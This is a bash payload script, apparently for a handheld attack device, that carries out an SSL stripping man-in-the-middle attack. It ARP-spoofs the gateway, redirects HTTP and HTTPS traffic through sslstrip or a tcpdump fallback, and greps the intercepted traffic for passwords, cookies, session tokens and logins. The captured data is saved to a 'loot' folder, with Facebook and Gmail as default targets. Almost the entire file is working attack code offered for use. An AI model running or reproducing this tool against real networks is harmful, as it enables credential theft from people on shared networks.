#!/bin/bash
# Title: SSL Strip
# Author: NullSec
# Description: SSL stripping attack to downgrade HTTPS to HTTP
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/sslstrip"
mkdir -p "$LOOT_DIR"

PROMPT "SSL STRIP

Downgrade HTTPS to HTTP
to capture credentials
in plaintext.

Intercepts HTTPS redirects
and serves HTTP versions.

Press OK to configure."

# Find interface
IFACE=""
for i in br-lan eth0 wlan1 wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No interface found!"; exit 1; }

GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
LOCAL_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)

[ -z "$GATEWAY" ] && { ERROR_DIALOG "No gateway found!"; exit 1; }

PROMPT "STRIP MODE:

1. Basic SSL strip
2. Strip + credential log
3. Strip + full request log
4. Targeted domains only

Interface: $IFACE
Gateway: $GATEWAY

Select mode next."

STRIP_MODE=$(NUMBER_PICKER "Mode (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) STRIP_MODE=2 ;; esac

LISTEN_PORT=$(NUMBER_PICKER "Listen port:" 10000)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) LISTEN_PORT=10000 ;; esac

TARGET_DOMAINS=""
if [ "$STRIP_MODE" -eq 4 ]; then
    TARGET_DOMAINS=$(TEXT_PICKER "Target domains:" "facebook.com gmail.com")
    PROMPT "TARGETED DOMAINS:

$TARGET_DOMAINS

Only these domains
will be stripped.

Press OK to continue."
fi

DURATION=$(NUMBER_PICKER "Duration (minutes):" 15)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=15 ;; esac

resp=$(CONFIRMATION_DIALOG "START SSL STRIP?

Mode: $STRIP_MODE
Port: $LISTEN_PORT
Duration: ${DURATION}m
Gateway: $GATEWAY

This is an active attack.
Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
STRIP_LOG="$LOOT_DIR/stripped_$TIMESTAMP.log"
CRED_LOG="$LOOT_DIR/creds_$TIMESTAMP.log"

LOG "Starting SSL Strip..."
SPINNER_START "Setting up SSL strip..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTPS traffic
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$LISTEN_PORT"
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "$LISTEN_PORT"

# ARP spoof the gateway
arpspoof -i "$IFACE" "$GATEWAY" > /dev/null 2>&1 &
ARP_PID=$!

# Start SSL strip or fallback
if command -v sslstrip >/dev/null 2>&1; then
    case $STRIP_MODE in
        1) timeout $((DURATION * 60)) sslstrip -l "$LISTEN_PORT" 2>/dev/null & ;;
        2) timeout $((DURATION * 60)) sslstrip -l "$LISTEN_PORT" -w "$STRIP_LOG" -f 2>/dev/null & ;;
        3) timeout $((DURATION * 60)) sslstrip -l "$LISTEN_PORT" -w "$STRIP_LOG" -f -a 2>/dev/null & ;;
        4) timeout $((DURATION * 60)) sslstrip -l "$LISTEN_PORT" -w "$STRIP_LOG" -f 2>/dev/null & ;;
    esac
    STRIP_PID=$!
else
    # Fallback: tcpdump credential capture
    LOG "sslstrip not found, using tcpdump fallback"
    timeout $((DURATION * 60)) tcpdump -i "$IFACE" -A -s 0 'tcp port 80' 2>/dev/null | \
        grep -iE "user|pass|login|email|auth|cookie|session|token" > "$STRIP_LOG" &
    STRIP_PID=$!
fi

# Background credential extractor
(
    while kill -0 $STRIP_PID 2>/dev/null; do
        sleep 10
        [ -f "$STRIP_LOG" ] && grep -iE "password|passwd|pass=|pwd=|user=|email=|login=" "$STRIP_LOG" 2>/dev/null | \
            sort -u > "$CRED_LOG"
    done
) &
CRED_PID=$!

SPINNER_STOP

PROMPT "SSL STRIP ACTIVE!

Stripping HTTPS on
port $LISTEN_PORT

Credentials logged to:
$CRED_LOG

Full log:
$STRIP_LOG

Press OK when done
or wait ${DURATION}m."

# Wait for strip to finish
wait $STRIP_PID 2>/dev/null

# Cleanup
kill $ARP_PID $CRED_PID 2>/dev/null
iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$LISTEN_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "$LISTEN_PORT" 2>/dev/null
echo 0 > /proc/sys/net/ipv4/ip_forward

CRED_COUNT=0
[ -f "$CRED_LOG" ] && CRED_COUNT=$(wc -l < "$CRED_LOG" | tr -d ' ')
STRIP_SIZE=""
[ -f "$STRIP_LOG" ] && STRIP_SIZE=$(du -h "$STRIP_LOG" | awk '{print $1}')

PROMPT "SSL STRIP STOPPED

Credentials found: $CRED_COUNT
Log size: ${STRIP_SIZE:-0}

Saved to:
$LOOT_DIR/

Forwarding disabled.

Press OK to exit."
